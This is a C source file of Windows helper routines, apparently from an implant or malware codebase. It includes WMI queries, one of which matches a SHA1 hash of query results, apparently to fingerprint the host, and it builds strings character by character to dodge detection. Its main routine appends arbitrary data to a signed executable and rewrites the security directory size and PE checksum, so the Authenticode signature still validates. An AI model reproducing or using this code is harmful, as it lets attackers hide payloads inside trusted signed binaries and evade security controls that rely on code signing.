#include <Windows.h>
#include "utils.h"
#include "proto.h"
#include "zmem.h"

BOOL ExecQueryGetProp(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField,  LPVARIANT lpVar)
{
	BOOL bRet = FALSE;
	IEnumWbemClassObject *pEnum;
	
	BSTR bstrQuery = SysAllocString(strQuery);
	BSTR bstrField = SysAllocString(strField);
	
	WCHAR strWQL[] = { L'W', L'Q', L'L', L'\0' };
	BSTR bWQL = SysAllocString(strWQL);

	HRESULT hr = pSvc->ExecQuery(bWQL, bstrQuery, 0, NULL, &pEnum);
	if (hr == S_OK)
	{
		ULONG uRet;
		IWbemClassObject *apObj;
		hr = pEnum->Next(5000, 1, &apObj, &uRet);
		if (hr == S_OK)
		{
			hr = apObj->Get(bstrField, 0, lpVar, NULL, NULL);
			if (hr == WBEM_S_NO_ERROR)
				bRet = TRUE;

			apObj->Release();
		}
		pEnum->Release();
	}

	SysFreeString(bstrQuery);
	SysFreeString(bstrField);
	SysFreeString(bWQL);
	
	return bRet;
}

BOOL ExecQuerySearchEntryHash(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField, LPBYTE pSearchHash, LPVARIANT lpVar)
{
	BOOL bFound = FALSE;
	IEnumWbemClassObject *pEnum;
	WCHAR strWQL[] = { L'W', L'Q', L'L', L'\0' };
	
	BSTR bWQL = SysAllocString(strWQL);
	BSTR bstrQuery = SysAllocString(strQuery);
	BSTR bstrField = SysAllocString(strField);

	HRESULT hr = pSvc->ExecQuery(bWQL, bstrQuery, 0, NULL, &pEnum);
	if (hr == S_OK)
	{
		ULONG uRet;
		IWbemClassObject *apObj;

		while (pEnum->Next(5000, 1, &apObj, &uRet) == S_OK)
		{
			hr = apObj->Get(bstrField, 0, lpVar, NULL, NULL);
			if (hr != WBEM_S_NO_ERROR ||  lpVar->vt != VT_BSTR)
				continue;

			BYTE pSha1Buffer[20];
			CalculateSHA1(pSha1Buffer, (LPBYTE)lpVar->bstrVal, 21*sizeof(WCHAR));
			if (!memcmp(pSha1Buffer, pSearchHash, 20))
				bFound = TRUE;

			apObj->Release();
		}

		pEnum->Release();
	}

	SysFreeString(bstrQuery);
	SysFreeString(bstrField);
	SysFreeString(bWQL);

	return bFound;
}


LPBYTE GetRandomData(__in DWORD dwBuffLen)
{
	LPBYTE lpBuffer = (LPBYTE) malloc(dwBuffLen);
	AppendRandomData(lpBuffer, dwBuffLen);
	return lpBuffer;
}

VOID AppendRandomData(PBYTE pBuffer, DWORD uBuffLen)
{
	DWORD i;
	static BOOL uFirstTime = TRUE;

	if (uFirstTime) {
		srand(GetTickCount());
		uFirstTime = FALSE;
	}

	for (i=0; i<uBuffLen; i++)
		pBuffer[i] = rand();
}

/*	Append data to a signed executable without invalidating its signature.
	N.B. pad data must be 8 byte aligned 

	RETURNS a pointer to a buffer containing a fat signed executable, NULL otherwise
*/
LPBYTE AppendDataInSignedExecutable(LPWSTR lpTargetExecutable, LPBYTE lpPadData, DWORD dwPadDataSize, PDWORD dwFatExecutableSize)
{
	*dwFatExecutableSize = 0;

	/* read target executable content */
	HANDLE hExecutable = CreateFile(lpTargetExecutable, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if( hExecutable == INVALID_HANDLE_VALUE )
		return NULL;

	LPBYTE lpBuffer = AppendDataInSignedExecutable(hExecutable, lpPadData, dwPadDataSize, dwFatExecutableSize);

	CloseHandle(hExecutable);

	return lpBuffer;
}

LPBYTE AppendDataInSignedExecutable(HANDLE hExecutable, LPBYTE lpPadData, DWORD dwPadDataSize, PDWORD dwFatExecutableSize)
{
		
	DWORD dwExecutableSize = 0;
	dwExecutableSize = GetFileSize(hExecutable, NULL);
	LPBYTE lpExecutableBuffer = (LPBYTE) zalloc(dwExecutableSize);

	DWORD dwBytesRead = 0;

	if( !ReadFile(hExecutable, lpExecutableBuffer, dwExecutableSize, &dwBytesRead, NULL) )
	{
#ifdef _DEBUG
		OutputDebugString(L"Can't read file");
#endif
		return NULL;
	}
	
	

	/* optional_header -> data_directory -> image_directory_entry_security */

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) lpExecutableBuffer;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS) (lpExecutableBuffer + pDosHeader->e_lfanew);
	
	DWORD dwSecurityDirectoryRva =  0;
	DWORD dwSecurityDirectorySize =  0;
	
	dwSecurityDirectoryRva  = (DWORD)(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress);  
	dwSecurityDirectorySize = (DWORD)(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size);  

	/* if file is not signed return */
	if( dwSecurityDirectoryRva == 0 )
	{
#ifdef _DEBUG
		OutputDebugString(L"No signature");
#endif
		return NULL;
	}

	/* pad data must be a 8 byte multiple */
	if( dwPadDataSize % 8 != 0 )
	{
#ifdef _DEBUG
		OutputDebugString(L"No pad");
#endif
		return NULL;
	}


	/* create a buffer to host the new executable */
	LPBYTE lpFatExecutableBuffer = (LPBYTE) zalloc(dwExecutableSize + dwPadDataSize);

	/* 
		fat executable creation:
		1] old executable + pad
		2] update security entry size
		3] update pe checksum
	*/

	/* 1] old executable + pad */
	memcpy(lpFatExecutableBuffer, lpExecutableBuffer, dwExecutableSize);
	memcpy(lpFatExecutableBuffer + dwExecutableSize, lpPadData, dwPadDataSize);

	/* 2] update security entry size */
	pNtHeaders = (PIMAGE_NT_HEADERS) (lpFatExecutableBuffer + pDosHeader->e_lfanew);
	LPDWORD lpSecuritySize = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size);
	
	*lpSecuritySize = dwSecurityDirectorySize + dwPadDataSize;

	/* 3] update pe checksum */
	LPDWORD lpFatChecksum = &(pNtHeaders->OptionalHeader.CheckSum);
	DWORD dwNewFatChecksum = ComputePEChecksum(lpFatExecutableBuffer, dwExecutableSize + dwPadDataSize);
	
	if( dwNewFatChecksum == -1 )
	{
#ifdef _DEBUG
		OutputDebugString(L"Fail checksum");
#endif
		return NULL;
	}

	*lpFatChecksum = dwNewFatChecksum;


	/* cleanup */
	zfree(lpExecutableBuffer);


	*dwFatExecutableSize = dwExecutableSize + dwPadDataSize;
	return lpFatExecutableBuffer;
}


DWORD ComputePEChecksum(LPBYTE lpMz, DWORD dwBufferSize)
{
	HMODULE hImageHlp = LoadLibrary(L"Imagehlp.dll");
	if( hImageHlp == NULL )
		return -1;

	CHECKSUMMAPPEDFILE fpCheckSumMappedFile = (CHECKSUMMAPPEDFILE) GetProcAddress(hImageHlp, "CheckSumMappedFile");

	if( fpCheckSumMappedFile == NULL )
	{
		FreeLibrary(hImageHlp);
		return -1;
	}

	DWORD dwOriginalChecksum = 0;
	DWORD dwComputedChecksum = 0;
	fpCheckSumMappedFile(lpMz,dwBufferSize, &dwOriginalChecksum, &dwComputedChecksum);

	FreeLibrary(hImageHlp);

	return dwComputedChecksum;
}